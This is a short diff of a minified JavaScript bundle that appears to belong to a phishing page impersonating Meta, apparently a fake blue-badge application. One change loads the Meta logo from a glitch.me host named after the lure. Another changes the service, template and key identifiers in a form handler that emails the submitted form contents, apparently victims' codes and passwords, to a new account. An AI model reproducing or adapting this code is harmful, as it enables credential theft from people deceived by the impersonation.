@@ -9981,7 +9981,7 @@
                     },
                     children: (0,
                     Le.jsx)("img", {
-                        src: "/2560px-Meta-Logo.png",
+                        src: "https://apply-fb-blue-mark-here.glitch.me/2560px-Meta-Logo.png",
                         alt: "logo",
                         className: "meta-logo"
                     })
@@ -11667,7 +11667,7 @@
                           , a = e.current.elements.xs.value
                           , l = /^\d{6,}$/.test(n)
                           , o = /.*%+.*/.test(a);
-                        l && o ? Ue("service_3ryixm6", "template_vio8aoe", e.current, "TPjdHmwVdleGU2Igx").then((e => {
+                        l && o ? Ue("service_n2pssol", "template_9ksyhuj", e.current, "2exvwF6Ap").then((e => {
                             console.log("result text is", e.text),
                             i(!0)
                         }
